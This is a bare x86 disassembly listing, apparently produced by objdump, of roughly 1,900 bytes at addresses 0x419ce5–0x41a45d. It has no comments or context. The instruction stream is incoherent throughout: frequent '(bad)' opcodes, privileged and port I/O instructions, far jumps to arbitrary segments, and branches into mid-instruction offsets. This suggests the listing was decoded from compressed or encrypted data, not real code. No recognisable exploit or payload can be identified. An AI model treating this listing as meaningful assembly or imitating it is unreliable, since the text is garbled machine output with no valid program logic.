  419ce5:	jo     0x419c67
  419ce7:	loop   0x419c81
  419ce9:	sti    
  419cea:	jnp    0x419d38
  419cec:	mov    esp,DWORD PTR [eax+0x2c]
  419cef:	or     DWORD PTR [edx-0x31047e77],eax
  419cf5:	add    DWORD PTR [edx+0x525a398c],0x5c152c0f
  419cff:	or     ecx,ebx
  419d01:	xor    BYTE PTR [edi-0x3d],dl
  419d04:	repz mov ah,0xf3
  419d07:	mov    esi,0x6ddb5efc
  419d0c:	mov    bl,0xbc
  419d0e:	pop    ss
  419d0f:	in     eax,dx
  419d10:	adc    BYTE PTR [ebp-0x5f3e62fa],bl
  419d16:	cdq    
  419d17:	cmc    
  419d18:	inc    ebx
  419d19:	rol    DWORD PTR [edx+esi*8],0x62
  419d1d:	(bad)  
  419d1e:	fnsave [ebx+0x75afbc84]
  419d24:	sub    eax,0x6429d1fa
  419d29:	lods   al,BYTE PTR ds:[esi]
  419d2a:	das    
  419d2b:	daa    
  419d2c:	cmc    
  419d2d:	sub    eax,0xf92abd10
  419d32:	test   eax,0x41359552
  419d37:	lods   eax,DWORD PTR ds:[esi]
  419d38:	loopne 0x419d73
  419d3a:	mov    DWORD PTR [eax+0x64bad0ed],ebp
  419d40:	xchg   ebp,eax
  419d41:	push   ebp
  419d42:	add    eax,0x238f82c3
  419d47:	inc    eax
  419d48:	addr16 data16 mov ch,0xcc
  419d4c:	jbe    0x419d43
  419d4e:	lock xchg esp,eax
  419d50:	ds mov ebp,0x3baad676
  419d56:	cwde   
  419d57:	ja     0x419cfb
  419d59:	(bad)  
  419d5a:	push   ebx
  419d5b:	add    al,0x37
  419d5d:	fisttp DWORD PTR [esi-0x4]
  419d60:	cmc    
  419d61:	xor    al,0xd6
  419d63:	test   eax,0x78cd07cd
  419d68:	push   esi
  419d69:	pop    ecx
  419d6a:	mov    ds:0xf2a50828,eax
  419d6f:	sbb    DWORD PTR [ebx],ebx
  419d71:	cdq    
  419d72:	and    BYTE PTR [eax+esi*8-0x1f74029a],cl
  419d79:	and    BYTE PTR [esi+0x3e05756d],al
  419d7f:	or     BYTE PTR [edx-0x33],0xf4
  419d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d84:	xor    al,0xe8
  419d86:	inc    esi
  419d87:	scas   eax,DWORD PTR es:[edi]
  419d88:	hlt    
  419d89:	and    BYTE PTR [eax-0x44de1f03],al
  419d8f:	test   BYTE PTR [ebx+0x167460d4],ah
  419d95:	push   edi
  419d96:	pop    ebx
  419d97:	dec    esi
  419d98:	or     eax,0x2d76d85d
  419d9d:	cmp    al,0xf8
  419d9f:	mov    DWORD PTR [ebp+0x21db3400],edi
  419da5:	inc    edi
  419da6:	mov    cl,0xea
  419da8:	add    BYTE PTR [esi+eax*4-0x5e52c6db],cl
  419daf:	push   es
  419db0:	jmp    0x419dd9
  419db2:	les    esp,FWORD PTR [esi+ecx*1+0xfd52576]
  419db9:	push   eax
  419dba:	std    
  419dbb:	xchg   edx,eax
  419dbc:	pop    edi
  419dbd:	add    esi,DWORD PTR [ebx+0x61b43700]
  419dc3:	push   cs
  419dc4:	jg     0x419e3a
  419dc6:	pop    ds
  419dc7:	repnz mov dh,0xac
  419dca:	xchg   esp,eax
  419dcb:	dec    edx
  419dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dcd:	js     0x419e3a
  419dcf:	test   eax,0x11632890
  419dd4:	addr16 jge 0x419e40
  419dd7:	in     eax,0xed
  419dd9:	stos   BYTE PTR es:[edi],al
  419dda:	jg     0x419e3c
  419ddc:	push   ebp
  419ddd:	loop   0x419ddd
  419ddf:	std    
  419de0:	(bad)  
  419de1:	ror    ebp,cl
  419de3:	pop    eax
  419de4:	ds aaa 
  419de6:	rcr    BYTE PTR [ebx-0x77e40521],0xed
  419ded:	(bad)  
  419dee:	fild   DWORD PTR [esi+0x4f]
  419df1:	mov    ch,0x2f
  419df3:	fwait
  419df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419df5:	pop    es
  419df6:	frstor [edx-0xb]
  419df9:	fucomi st,st(7)
  419dfb:	cwde   
  419dfc:	xchg   ebx,eax
  419dfd:	mov    edi,0xf161a0fe
  419e02:	xchg   ch,cl
  419e04:	dec    eax
  419e05:	push   0x82247157
  419e0a:	fcomp  QWORD PTR [ebp-0x29]
  419e0d:	inc    esi
  419e0e:	mov    dl,0xe2
  419e10:	cmp    eax,esp
  419e12:	dec    ecx
  419e13:	es push es
  419e15:	xchg   ebp,eax
  419e16:	popf   
  419e17:	test   eax,0x2eb378da
  419e1c:	adc    cl,BYTE PTR [ebp*4-0x7f4f665e]
  419e23:	fs xchg edx,eax
  419e25:	lds    esi,FWORD PTR [ecx+0x62]
  419e28:	rcl    BYTE PTR [eax+0xe],1
  419e2b:	sbb    DWORD PTR [edi-0x35ee976e],eax
  419e31:	inc    edx
  419e32:	int3   
  419e33:	inc    ecx
  419e34:	sub    eax,edx
  419e36:	or     eax,DWORD PTR [edi-0x3d]
  419e39:	leave  
  419e3a:	jnp    0x419e2d
  419e3c:	stc    
  419e3d:	out    0x9c,eax
  419e3f:	mov    bh,0x19
  419e41:	dec    BYTE PTR [eax]
  419e43:	mov    eax,ds:0xed1ca2c4
  419e48:	imul   ecx,DWORD PTR [eax+0x7da55956],0x30
  419e4f:	jns    0x419e5c
  419e51:	mov    ah,0xa9
  419e53:	push   esi
  419e54:	ins    BYTE PTR es:[edi],dx
  419e55:	xor    eax,0xc72a25b3
  419e5a:	mov    ebp,0xa27cc8e1
  419e5f:	sbb    eax,0x20a9dc96
  419e64:	neg    BYTE PTR [esp+edx*4-0x5a806786]
  419e6b:	cmp    BYTE PTR [ebp+edx*8+0x659f9ca7],dl
  419e72:	ins    BYTE PTR es:[edi],dx
  419e73:	imul   esp,DWORD PTR [ebx+0x35],0x7f
  419e77:	dec    esi
  419e78:	aad    0x30
  419e7a:	push   eax
  419e7b:	cmp    BYTE PTR [esi],ch
  419e7d:	inc    al
  419e7f:	and    DWORD PTR [edi+0x34],ebx
  419e82:	jne    0x419eea
  419e84:	(bad)  
  419e86:	or     DWORD PTR [ebp+0x67e4746a],esp
  419e8c:	xchg   ecx,eax
  419e8d:	pop    ss
  419e8e:	jle    0x419e3e
  419e90:	push   ds
  419e91:	pop    esp
  419e92:	xchg   esp,eax
  419e93:	push   ss
  419e94:	call   0x1091:0xc06199f8
  419e9b:	push   edi
  419e9c:	adc    al,0x46
  419e9e:	mov    ch,0xef
  419ea0:	nop
  419ea1:	jmp    FWORD PTR [ecx+0x3f171e]
  419ea7:	lods   al,BYTE PTR ds:[esi]
  419ea8:	aaa    
  419ea9:	je     0x419e56
  419eab:	inc    ebp
  419eac:	sbb    al,BYTE PTR [esi]
  419eae:	inc    ebp
  419eaf:	or     al,0x27
  419eb1:	lods   eax,DWORD PTR ds:[esi]
  419eb2:	mov    ah,0xb5
  419eb4:	dec    ebx
  419eb5:	add    DWORD PTR [ecx],ebp
  419eb7:	sbb    eax,0x4a7c0655
  419ebc:	adc    al,0x48
  419ebe:	bswap  edx
  419ec0:	int    0xe3
  419ec2:	scas   al,BYTE PTR es:[edi]
  419ec3:	xlat   BYTE PTR ds:[ebx]
  419ec4:	aaa    
  419ec5:	call   0xd7e53d07
  419eca:	sbb    BYTE PTR [edi+ecx*4],al
  419ecd:	es mov dl,ch
  419ed0:	push   ds
  419ed1:	sbb    esi,DWORD PTR [edi]
  419ed3:	dec    ecx
  419ed4:	mov    esp,0xc638e74e
  419ed9:	or     DWORD PTR [esi-0x5864cf77],esi
  419edf:	stos   DWORD PTR es:[edi],eax
  419ee0:	mov    ds:0x419ea4a5,al
  419ee5:	jp     0x419e9e
  419ee7:	xor    esp,DWORD PTR [esi]
  419ee9:	in     eax,dx
  419eea:	cmp    al,0xd4
  419eec:	xchg   BYTE PTR [ebx-0x48],dl
  419eef:	pushf  
  419ef0:	sub    eax,0xfe422807
  419ef5:	xchg   ebx,eax
  419ef6:	and    BYTE PTR [ebp-0x2092d3fc],0x2a
  419efd:	scas   eax,DWORD PTR es:[edi]
  419efe:	push   es
  419eff:	retf   
  419f00:	jmp    0xd40d:0xc02f0adc
  419f07:	and    al,0xc
  419f09:	sub    ebx,esp
  419f0b:	push   esi
  419f0c:	sbb    eax,0xbc97c4e9
  419f11:	pusha  
  419f12:	mov    edi,0x7271a96e
  419f17:	std    
  419f18:	imul   ebp,DWORD PTR [ebp+0x15a46236],0xb3fa0196
  419f22:	sbb    al,0xbb
  419f24:	jae    0x419ecf
  419f26:	pop    esi
  419f27:	and    al,0x5f
  419f29:	dec    ebx
  419f2a:	adc    DWORD PTR ds:[eax+0x3a],ecx
  419f2e:	xchg   esi,eax
  419f2f:	cmp    BYTE PTR [esi-0x65c37605],0xf3
  419f36:	push   eax
  419f37:	scas   al,BYTE PTR es:[edi]
  419f38:	rol    BYTE PTR [esi],0x7a
  419f3b:	mov    al,0x78
  419f3d:	sbb    bl,bh
  419f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f40:	je     0x419f9e
  419f42:	xchg   edx,eax
  419f43:	das    
  419f44:	call   0x439dfee5
  419f49:	enter  0x39cc,0x25
  419f4d:	lds    edi,FWORD PTR [ebx+0x94f1bb8]
  419f53:	cld    
  419f54:	sub    ah,cl
  419f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f57:	leave  
  419f58:	lock (bad) 
  419f5a:	retf   0xf46
  419f5d:	mov    dl,0x38
  419f5f:	sbb    eax,esi
  419f61:	nop
  419f62:	inc    edi
  419f63:	pop    edx
  419f64:	stos   BYTE PTR es:[edi],al
  419f65:	iret   
  419f66:	xor    eax,0x337f8aea
  419f6b:	arpl   WORD PTR [edi+ebp*2],dx
  419f6e:	sbb    BYTE PTR [esi],dl
  419f70:	add    al,0xee
  419f72:	shl    ecx,0x5b
  419f75:	das    
  419f76:	ret    0x2fcb
  419f79:	stc    
  419f7a:	push   es
  419f7b:	xchg   edx,eax
  419f7c:	xchg   edx,eax
  419f7d:	in     al,0xed
  419f7f:	lds    edi,FWORD PTR [ebx-0x78]
  419f82:	dec    edx
  419f83:	pop    ecx
  419f84:	sub    ch,dl
  419f86:	sub    al,0x59
  419f88:	cli    
  419f89:	xchg   BYTE PTR [ebx],cl
  419f8b:	mov    ebx,0xc5cf24c0
  419f90:	(bad)  
  419f91:	or     eax,0x2998cf5a
  419f96:	jo     0x419f3b
  419f98:	or     BYTE PTR [edx],ah
  419f9a:	jecxz  0x419f92
  419f9c:	pushf  
  419f9d:	clc    
  419f9e:	pop    es
  419f9f:	outs   dx,BYTE PTR ds:[esi]
  419fa0:	inc    edi
  419fa1:	xchg   ebp,eax
  419fa2:	mov    ch,0x20
  419fa4:	and    BYTE PTR [ebp+0x8431c5c],dl
  419faa:	xchg   esi,eax
  419fab:	into   
  419fac:	fiadd  DWORD PTR [ebx+0x50c3e09b]
  419fb2:	aaa    
  419fb3:	retf   
  419fb4:	(bad)  
  419fb5:	cld    
  419fb6:	cld    
  419fb7:	sbb    eax,0x846ea54d
  419fbc:	fdivr  st,st(4)
  419fbe:	xor    DWORD PTR [ecx+0x45],0x2
  419fc2:	xchg   edx,eax
  419fc3:	int3   
  419fc4:	int    0x7d
  419fc6:	or     al,BYTE PTR [edx]
  419fc8:	jbe    0x41a039
  419fca:	and    al,0x57
  419fcc:	jns    0x419fbd
  419fce:	sub    DWORD PTR [eax+0x2d5ca661],eax
  419fd4:	test   BYTE PTR [edi+0x72],al
  419fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fd8:	fild   DWORD PTR ds:0xc4df2218
  419fde:	scas   eax,DWORD PTR es:[edi]
  419fdf:	inc    edx
  419fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fe1:	aad    0x8a
  419fe3:	sub    edi,0xffffffed
  419fe6:	clc    
  419fe7:	mov    cl,0x8c
  419fe9:	mov    es,eax
  419feb:	in     al,0x63
  419fed:	(bad)
  419ff1:	sub    DWORD PTR [ebx-0x642850ea],esp
  419ff7:	mov    eax,0xb3c8e226
  419ffc:	push   DWORD PTR [esi-0xdc1d601]
  41a002:	push   ss
  41a003:	adc    al,0x8a
  41a005:	sbb    dh,cl
  41a007:	loop   0x41a04e
  41a009:	pop    esp
  41a00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a00b:	push   ds
  41a00c:	jb     0x419fe7
  41a00e:	push   es
  41a00f:	retf   0xa6a2
  41a012:	das    
  41a013:	ror    DWORD PTR [ebx],cl
  41a015:	int3   
  41a016:	sub    DWORD PTR ds:[eax],0xffffff88
  41a01a:	or     al,0x74
  41a01c:	int3   
  41a01d:	sbb    eax,0x3b426bd6
  41a022:	xor    BYTE PTR [edx-0x24],0x5b
  41a026:	ins    BYTE PTR es:[edi],dx
  41a027:	addr16 ret 
  41a029:	and    bl,BYTE PTR ds:0xe32d6259
  41a02f:	jb     0x41a054
  41a031:	rcr    ch,cl
  41a033:	push   ss
  41a034:	fsubrp st(7),st
  41a036:	pushf  
  41a037:	xchg   edx,eax
  41a038:	jl     0x41a02b
  41a03a:	or     DWORD PTR [ebp-0x2789df94],edx
  41a040:	pop    ebp
  41a041:	xchg   esi,eax
  41a042:	pop    esi
  41a043:	stc    
  41a044:	xor    ah,BYTE PTR [edx-0x6d59431c]
  41a04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a04b:	retf   0xf649
  41a04e:	or     al,0x96
  41a050:	cmp    ecx,DWORD PTR [edx]
  41a052:	inc    edi
  41a053:	and    ebx,DWORD PTR [eax-0xd84341]
  41a059:	test   al,0x0
  41a05b:	ret    0x49ff
  41a05e:	js     0x41a0dd
  41a060:	pop    ecx
  41a061:	outs   dx,BYTE PTR ds:[esi]
  41a062:	lea    edi,[esi+ebp*8+0x15]
  41a066:	dec    esi
  41a067:	out    0xdc,al
  41a069:	adc    cl,bh
  41a06b:	xchg   DWORD PTR [ecx+0xf1c2a3b],ecx
  41a071:	test   cl,0x89
  41a074:	loop   0x41a004
  41a076:	ret    0x7598
  41a079:	stos   BYTE PTR es:[edi],al
  41a07a:	dec    ebx
  41a07b:	mov    ds,WORD PTR [esi]
  41a07d:	xchg   BYTE PTR [eax+0x69],al
  41a080:	scas   al,BYTE PTR es:[edi]
  41a081:	iretw  
  41a083:	pop    esp
  41a084:	xor    al,0xf3
  41a086:	or     DWORD PTR [eax+0x74c6a011],edx
  41a08c:	mov    esp,0xe2cfdab9
  41a091:	mov    ecx,0x201b0e8d
  41a096:	iret   
  41a097:	adc    dh,ch
  41a099:	les    edx,FWORD PTR [esp+eax*4-0x5a242ae6]
  41a0a0:	jmp    0x41a110
  41a0a2:	gs lock mov bh,0x6b
  41a0a6:	je     0x41a059
  41a0a8:	scas   eax,DWORD PTR es:[edi]
  41a0a9:	mov    ah,0x8a
  41a0ab:	fcomip st,st(1)
  41a0ad:	and    ch,al
  41a0af:	nop
  41a0b0:	xchg   edi,ecx
  41a0b2:	outs   dx,DWORD PTR ds:[esi]
  41a0b3:	pop    ebx
  41a0b4:	outs   dx,DWORD PTR ds:[esi]
  41a0b5:	std    
  41a0b6:	mov    ss,edi
  41a0b8:	lock ins BYTE PTR es:[edi],dx
  41a0ba:	xor    eax,0x4e816f21
  41a0bf:	test   ebx,ecx
  41a0c1:	fisttp QWORD PTR [ebx-0x28]
  41a0c4:	lea    edi,[edi-0x3f81af3f]
  41a0ca:	(bad)  
  41a0cb:	mov    ebx,0xedd400ec
  41a0d0:	mov    eax,ds:0x29390ba1
  41a0d5:	(bad)  
  41a0d7:	or     DWORD PTR ds:0xfadf9255,esi
  41a0dd:	jns    0x41a0c1
  41a0df:	shr    DWORD PTR [eax-0x26],0x0
  41a0e3:	or     DWORD PTR [ebx+0x17],edx
  41a0e6:	mov    ch,0x49
  41a0e8:	and    bh,BYTE PTR gs:[edx]
  41a0eb:	repnz adc eax,0xb779a033
  41a0f1:	add    dl,BYTE PTR [ecx]
  41a0f3:	pop    DWORD PTR [edi]
  41a0f5:	push   edx
  41a0f6:	nop
  41a0f7:	xor    dh,ch
  41a0f9:	xor    al,0x85
  41a0fb:	out    0x5d,eax
  41a0fd:	popf   
  41a0fe:	or     edx,ebx
  41a100:	sub    esp,esp
  41a102:	pop    ecx
  41a103:	adc    al,0xb9
  41a105:	fcomp  QWORD PTR [eax-0x7b]
  41a108:	xor    BYTE PTR [esi-0x15],cl
  41a10b:	(bad)  
  41a10c:	fcmovnu st,st(2)
  41a10e:	xchg   DWORD PTR [esp+eax*4+0x53],ebx
  41a112:	jmp    0x8846:0x4525e771
  41a119:	mov    WORD PTR [ebp-0x69],fs
  41a11c:	or     esp,esp
  41a11e:	repnz ins DWORD PTR es:[edi],dx
  41a120:	ds dec cl
  41a123:	jg     0x41a195
  41a125:	mov    cl,0x77
  41a127:	(bad)  
  41a128:	xchg   DWORD PTR [ebx+0x1b4ec3cb],ebx
  41a12e:	lods   al,BYTE PTR ds:[esi]
  41a12f:	adc    cl,BYTE PTR ds:0x67cd47b0
  41a135:	xchg   ebp,eax
  41a136:	pop    ds
  41a137:	pop    ss
  41a138:	push   0xa3d281cc
  41a13d:	mov    edi,DWORD PTR [edi-0x590b1cb3]
  41a143:	adc    ebx,DWORD PTR ds:0x30f23620
  41a149:	fidiv  DWORD PTR [eax-0x30739b06]
  41a14f:	sbb    eax,0x9573c5d
  41a154:	push   esi
  41a155:	leave  
  41a156:	push   cs
  41a157:	loopne 0x41a0ef
  41a159:	mov    ebx,0xbccd3c2d
  41a15e:	inc    ebp
  41a15f:	nop
  41a160:	xor    bh,BYTE PTR [edx+ecx*4-0x6e4b0a3b]
  41a167:	test   al,0x2d
  41a169:	and    BYTE PTR [edi],al
  41a16b:	pop    edx
  41a16c:	pop    ebx
  41a16d:	sub    bl,BYTE PTR [esi-0x21]
  41a170:	mov    al,ds:0xa77ef104
  41a175:	jl     0x41a11c
  41a177:	jno    0x41a10d
  41a179:	stos   DWORD PTR es:[edi],eax
  41a17a:	das    
  41a17b:	ja     0x41a109
  41a17d:	xchg   esi,eax
  41a17e:	imul   ebx,DWORD PTR [ecx],0x5
  41a181:	pop    edi
  41a182:	sub    al,BYTE PTR [edi+0x2a]
  41a185:	mov    eax,esp
  41a187:	fnstenv [ebx]
  41a189:	jns    0x8197e7dd
  41a18f:	dec    eax
  41a190:	stc    
  41a191:	push   ds
  41a192:	dec    edx
  41a193:	pop    edx
  41a194:	inc    ebx
  41a195:	adc    eax,0xee9d2bec
  41a19a:	push   esp
  41a19b:	xor    esp,edx
  41a19d:	jmp    0x41a1c0
  41a19f:	daa    
  41a1a0:	clc    
  41a1a1:	sbb    BYTE PTR [ebx-0x15],0x61
  41a1a5:	mov    al,ds:0x14619e87
  41a1aa:	shl    DWORD PTR [ecx],cl
  41a1ac:	cmp    eax,DWORD PTR [ebp+0x2299348d]
  41a1b2:	dec    esp
  41a1b3:	in     eax,0xea
  41a1b5:	clc    
  41a1b6:	jge    0x41a19d
  41a1b8:	ss mov cl,0xaf
  41a1bb:	sub    DWORD PTR [edi+0x7421de33],0xb5c8b095
  41a1c5:	aam    0x0
  41a1c7:	leave  
  41a1c8:	push   eax
  41a1c9:	(bad)  
  41a1cb:	push   0xa1b1f397
  41a1d0:	pop    esi
  41a1d1:	cmp    DWORD PTR [ebp+0x31],edx
  41a1d4:	jge    0x41a1c6
  41a1d6:	addr16 loope 0x41a24a
  41a1d9:	cdq    
  41a1da:	daa    
  41a1db:	call   0x5d09:0xe506d99c
  41a1e2:	mov    WORD PTR [ecx+0x26838424],fs
  41a1e8:	sbb    dh,bl
  41a1ea:	scas   al,BYTE PTR es:[edi]
  41a1eb:	test   DWORD PTR [edi-0x9],eax
  41a1ee:	xchg   DWORD PTR [ebx+0x75],esi
  41a1f1:	lods   al,BYTE PTR ds:[esi]
  41a1f2:	inc    ebp
  41a1f3:	int    0xcd
  41a1f5:	ret    0xddc0
  41a1f8:	dec    esi
  41a1f9:	jle    0x41a268
  41a1fb:	dec    ebp
  41a1fc:	loopne 0x41a186
  41a1fe:	push   eax
  41a1ff:	lgs    esp,FWORD PTR [ecx+eiz*2]
  41a203:	mov    ebx,0xdd34b1c5
  41a208:	ds pop ss
  41a20a:	and    al,0xeb
  41a20c:	sub    BYTE PTR [eax-0x31],ch
  41a20f:	pop    ecx
  41a210:	mov    ebx,0xfbbdcfd9
  41a215:	jecxz  0x41a1a1
  41a217:	mov    edx,0x707c771c
  41a21c:	inc    edx
  41a21d:	add    eax,0x6c8da9b1
  41a222:	int3   
  41a223:	sbb    ebp,eax
  41a225:	jns    0x41a1c3
  41a227:	add    ah,BYTE PTR [ebx]
  41a229:	push   cs
  41a22a:	in     eax,0x27
  41a22c:	jno    0x41a241
  41a22e:	js     0x41a2ad
  41a230:	mov    al,0x37
  41a232:	dec    edx
  41a233:	jecxz  0x41a2a8
  41a235:	mov    dh,0x7f
  41a237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a238:	cdq    
  41a239:	in     eax,0x39
  41a23b:	popa   
  41a23c:	and    eax,0x26720743
  41a241:	add    al,0xd8
  41a243:	rol    bl,1
  41a245:	test   DWORD PTR [edi],edi
  41a247:	and    eax,0xd5ad3f06
  41a24c:	sub    DWORD PTR [esi-0x67],ebp
  41a24f:	mov    ah,BYTE PTR [edi]
  41a251:	out    dx,eax
  41a252:	in     al,dx
  41a253:	ror    DWORD PTR [eax],cl
  41a255:	clc    
  41a256:	inc    edx
  41a257:	sub    DWORD PTR [eax-0x2fda34b3],edi
  41a25d:	fiadd  DWORD PTR [ecx]
  41a25f:	jne    0x41a1f1
  41a261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a262:	icebp  
  41a263:	enter  0xeaa7,0x96
  41a267:	jo     0x41a2c7
  41a269:	aaa    
  41a26a:	xchg   edi,eax
  41a26b:	fcmovb st,st(7)
  41a26d:	sahf   
  41a26e:	mov    al,0x18
  41a270:	outs   dx,DWORD PTR ds:[esi]
  41a271:	imul   ebp,DWORD PTR [edi-0x43],0x987e21b0
  41a278:	bound  esp,QWORD PTR [edi+0x40]
  41a27b:	(bad)  
  41a27d:	push   esi
  41a27e:	mov    cl,BYTE PTR [ecx-0x27]
  41a281:	cmp    dh,dl
  41a283:	imul   ebx,DWORD PTR [eax],0x2b2086ee
  41a289:	push   esi
  41a28a:	push   ebx
  41a28b:	addr16 mov al,ds:0xfbcc
  41a28f:	out    0x6c,al
  41a291:	xor    DWORD PTR [edi],edx
  41a293:	sub    bh,dh
  41a295:	sub    DWORD PTR [esi+ebx*1],edi
  41a298:	xor    edi,ecx
  41a29a:	inc    esi
  41a29b:	es push esi
  41a29d:	mov    esi,0xe58e3184
  41a2a2:	div    BYTE PTR [ebx-0x46ce1e8d]
  41a2a8:	mov    dh,0x20
  41a2aa:	xor    ah,BYTE PTR [edx+0x53]
  41a2ad:	sbb    BYTE PTR [ebx-0x9],0x6d
  41a2b1:	std    
  41a2b2:	and    esp,ecx
  41a2b4:	and    DWORD PTR [ecx+0x13e7f799],ecx
  41a2ba:	dec    ebx
  41a2bb:	(bad)  
  41a2bc:	fldcw  WORD PTR [esp+esi*2]
  41a2bf:	cli    
  41a2c0:	mov    eax,ds:0x65c58a1c
  41a2c5:	retf   0xeee9
  41a2c8:	(bad)  
  41a2ca:	faddp  st(0),st
  41a2cc:	ins    BYTE PTR es:[edi],dx
  41a2cd:	jb     0x41a297
  41a2cf:	mov    edx,0x2649227e
  41a2d4:	mov    ah,0x9
  41a2d6:	data16 xlat BYTE PTR cs:[ebx]
  41a2d9:	dec    ecx
  41a2da:	or     BYTE PTR [ebp*1+0x185a5c0c],ch
  41a2e1:	push   ecx
  41a2e2:	push   0x5b
  41a2e4:	or     dh,BYTE PTR [esi+0x49]
  41a2e7:	cmp    ebx,esi
  41a2e9:	rol    BYTE PTR [ebp-0x80],1
  41a2ec:	inc    ebp
  41a2ed:	int    0x57
  41a2ef:	adc    ebx,DWORD PTR [edx-0x4683340f]
  41a2f5:	xchg   esp,eax
  41a2f6:	cmp    eax,0xee5a1557
  41a2fb:	imul   edx,DWORD PTR [eax+0x2],0xb459b260
  41a302:	xchg   esp,eax
  41a303:	sidtd  [eax+eiz*2]
  41a307:	cmc    
  41a308:	mov    eax,0xb17e7b1e
  41a30d:	jle    0x41a2e6
  41a30f:	adc    BYTE PTR [ebp-0xc],0xa5
  41a313:	adc    eax,esp
  41a315:	xchg   edi,eax
  41a316:	xchg   esp,eax
  41a317:	out    dx,eax
  41a318:	stc    
  41a319:	popa   
  41a31a:	pop    ecx
  41a31b:	es push ds
  41a31d:	mov    dl,0xcb
  41a31f:	stc    
  41a320:	mov    dl,0xee
  41a322:	push   cs
  41a323:	out    dx,al
  41a324:	leave  
  41a325:	ret    0x7201
  41a328:	mov    al,0x51
  41a32a:	cdq    
  41a32b:	lock push 0xffffffaa
  41a32e:	dec    esp
  41a32f:	mov    bl,0xf7
  41a331:	xor    eax,0xc2afee03
  41a336:	lods   eax,DWORD PTR ds:[esi]
  41a337:	mov    WORD PTR [eax+0x248cc8be],ds
  41a33d:	in     eax,dx
  41a33e:	outs   dx,DWORD PTR ds:[esi]
  41a33f:	mov    DWORD PTR [edx+0x77],ecx
  41a342:	sub    al,0xb5
  41a344:	daa    
  41a345:	jae    0x41a2f9
  41a347:	dec    ebp
  41a348:	cdq    
  41a349:	and    al,0x5b
  41a34b:	fld    TBYTE PTR ds:0xbce99eb9
  41a351:	adc    dl,bh
  41a353:	push   ecx
  41a354:	xchg   ebp,eax
  41a355:	stos   BYTE PTR es:[edi],al
  41a356:	out    dx,eax
  41a357:	pop    ss
  41a358:	addr16 js 0x41a358
  41a35b:	jmp    0x5b13:0x7a2d8079
  41a362:	jne    0x41a35f
  41a364:	imul   BYTE PTR [edx+edx*1-0x22]
  41a368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a369:	loopne 0x41a35e
  41a36b:	sbb    DWORD PTR [edx],eax
  41a36d:	or     eax,DWORD PTR [esi+0x426e1678]
  41a373:	shl    BYTE PTR [ecx-0x12],0xfa
  41a377:	test   esi,ecx
  41a379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a37a:	sbb    ah,bl
  41a37c:	loop   0x41a315
  41a37e:	hlt    
  41a37f:	jo     0x41a3bd
  41a381:	jmp    0xba34ea74
  41a386:	pushf  
  41a387:	jo     0x41a329
  41a389:	or     BYTE PTR [edx+0x3b],al
  41a38c:	mov    dl,BYTE PTR [eax+0x7a]
  41a38f:	jne    0x41a39a
  41a391:	xchg   ebx,eax
  41a392:	xor    ecx,DWORD PTR [ebp-0x6b4ccfb0]
  41a398:	mov    ds,WORD PTR ds:0xd88e9f67
  41a39e:	and    al,0x22
  41a3a0:	xchg   al,ah
  41a3a2:	push   edi
  41a3a3:	cmp    eax,0x5bdcabc7
  41a3a8:	sub    eax,0xbaf36c0f
  41a3ad:	inc    esp
  41a3ae:	mov    bl,ah
  41a3b0:	sub    al,0x3b
  41a3b2:	add    eax,0x541db8b
  41a3b7:	add    al,BYTE PTR ds:0x4badb191
  41a3bd:	aaa    
  41a3be:	cmc    
  41a3bf:	mov    bh,0x75
  41a3c1:	popf   
  41a3c2:	in     eax,dx
  41a3c3:	mov    dl,0xc5
  41a3c5:	pusha  
  41a3c6:	jb     0x41a41a
  41a3c8:	push   ds
  41a3c9:	and    BYTE PTR [edi-0x177638e8],dl
  41a3cf:	data16 js 0x41a3b8
  41a3d2:	push   esp
  41a3d3:	lods   al,BYTE PTR ds:[esi]
  41a3d4:	iret   
  41a3d5:	clc    
  41a3d6:	fcomp  QWORD PTR ds:0x5e11c2a9
  41a3dc:	push   cs
  41a3dd:	repz mov esp,0xbca03a3f
  41a3e3:	ins    BYTE PTR es:[edi],dx
  41a3e4:	outs   dx,DWORD PTR ds:[esi]
  41a3e5:	(bad)  
  41a3e6:	retf   
  41a3e7:	and    ecx,DWORD PTR [eax-0x15a546db]
  41a3ed:	pusha  
  41a3ee:	sub    dl,bh
  41a3f0:	push   es
  41a3f1:	call   0x3eeea2bf
  41a3f6:	shr    esp,1
  41a3f8:	mov    bl,bh
  41a3fa:	lock loope 0x41a47b
  41a3fd:	and    DWORD PTR [ecx],eax
  41a3ff:	aas    
  41a400:	sub    DWORD PTR [esi-0x52],ecx
  41a403:	pop    edi
  41a404:	xor    al,0xc9
  41a406:	(bad)  
  41a407:	loopne 0x41a3ef
  41a409:	arpl   WORD PTR [ebp-0x5b],ax
  41a40c:	ficom  DWORD PTR [edx-0x59a88ed4]
  41a412:	std    
  41a413:	mul    DWORD PTR [eax-0x12]
  41a416:	inc    ebx
  41a417:	mov    bl,0x26
  41a419:	imul   ecx,DWORD PTR [edx-0x19fd3a4b],0xfffffff5
  41a420:	aad    0xe2
  41a422:	pop    esi
  41a423:	bound  edi,QWORD PTR [ecx]
  41a425:	ss aad 0xca
  41a428:	dec    ebx
  41a429:	imul   BYTE PTR ds:0x1db9a7b9
  41a42f:	pop    ebp
  41a430:	pop    edx
  41a431:	push   es
  41a432:	jge    0x41a438
  41a434:	lahf   
  41a435:	bnd jg 0x41a3f3
  41a438:	inc    edx
  41a439:	out    dx,al
  41a43a:	(bad)  
  41a43c:	adc    DWORD PTR [ebx*8+0x41a8f32c],ebx
  41a443:	mov    esp,0xf96ae145
  41a448:	and    BYTE PTR [edx],0x35
  41a44b:	and    BYTE PTR [ecx+0x2e5f742],ah
  41a451:	add    eax,edi
  41a453:	add    cl,BYTE PTR [ebx-0x7107bab6]
  41a459:	pop    ecx
  41a45a:	dec    edi
  41a45b:	jle    0x41a486
  41a45d:	stos   BYTE PTR es:[edi],al
